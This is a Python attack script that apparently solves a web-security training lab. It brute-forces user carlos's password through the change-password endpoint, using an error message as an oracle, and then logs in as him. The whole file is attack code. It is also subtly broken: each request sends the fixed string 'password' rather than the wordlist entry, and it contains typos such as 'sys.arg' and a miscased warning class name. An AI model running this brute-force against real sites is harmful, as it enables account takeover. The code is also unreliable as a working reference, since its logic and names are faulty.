import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestwarning)
proxies = {'http':'http://127.0.0.1:8080', 'https':'https://127.0.0.1:8080'}

def access_carlos_account(s, url):
    print("(+) Logging into weiner's account...")
    login_url = url + '/login'
    login_data = { 'username':'weiner', 'password':'peter'}
    r = s.post(login_url, data=login_data, verify=False, proxies=proxies)
    print("(+) Brute forcing into Carlos's account")
    change_password_url = url + '/my-account/change-password'
    with open('password.txt', 'r') as f:
            lines = f.readlines()
    for pwd in lines:
            pwd = pwd.strip(('\n'))
            change_password_data = { 'username':'carlos', 'current-password':'password', 'new-password-1':'password1', 'new-password-2':'password2'}
            r = s.post(change_password_url, data=change_password_data, verify=False, proxies = proxies)   
            if 'New passwords do not match' in r.text: 
                carlos_pwd = pwd
                print("(+) Carlos's password is: " + pwd)
                break 
    if carlos_pwd:
            #Login into carlos's account 
            print("(+) Logging into carlos's account...")
            login_data = { 'username':'carlos', 'password': carlos_pwd}
            r = requests.post(login_url, data=login_data, verify=False, proxies=proxies)          
            if 'log out' in r.text: 
                print("(+) We successfully solved the lab ")
                sys.exit(-1)
            else:
                print("(+) Check for the error inside the code and try again")
                sys.exit(-1)
    else:
        print('(+) Failed to login as carlos user')
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print('(+) Usage: %s' % sys.argv[0])
        print('(+) Example %s www.example.com' % sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()
    url = sys.arg[1]
    access_carlos_account(s, url)

if __name__ == '__main__':
    main()